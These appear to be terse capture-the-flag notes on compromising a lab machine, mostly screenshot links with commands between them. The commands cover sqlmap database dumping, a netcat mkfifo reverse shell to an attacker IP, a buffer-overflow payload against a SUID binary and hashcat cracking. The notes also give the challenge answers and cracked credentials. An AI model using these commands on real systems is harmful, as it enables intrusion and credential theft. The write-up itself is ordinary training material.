

![[Pasted image 20261014203550.png]]


![[Pasted image 20261014205026.png]]


![[Pasted image 20261014205515.png]]


![[Pasted image 20261014205624.png]]


![[Pasted image 20261014211114.png]]


save the request 
and use sqlmap

```
sqlmap -r rootx --dbs --batch 
```

```
 sqlmap -r rootx -D users --dump  --batch

```


![[Pasted image 20261014211310.png]]


![[Pasted image 20261014211337.png]]


![[Pasted image 20261014211434.png]]

username: pingudad
passwrd: secretpass 


![[Pasted image 20261014211815.png]]



![[Pasted image 20261014220629.png]]


mkfifo /tmp/lol;nc 192.168.152.214 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol 


![[Pasted image 20261014221427.png]]

![[Pasted image 20261014221446.png]]


```
python -c "import pty;pty.spawn('/bin/bash')"
```


![[Pasted image 20261014222231.png]]



![[Pasted image 20261014222328.png]]


```

ssh pingu@10.65.155.101  


```

![[Pasted image 20261014222440.png]]


What is the interesting path of the interesting suid file
Answer : /opt/secret/root


![[Pasted image 20261014224126.png]]


![[Pasted image 20261014224217.png]]

![[Pasted image 20261014224328.png]]



```

python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root

```




```

python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root

```

![[Pasted image 20261014230529.png]]


```

hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -O

```

![[Pasted image 20261014230942.png]]



What is the root password!
Answer: love2fish


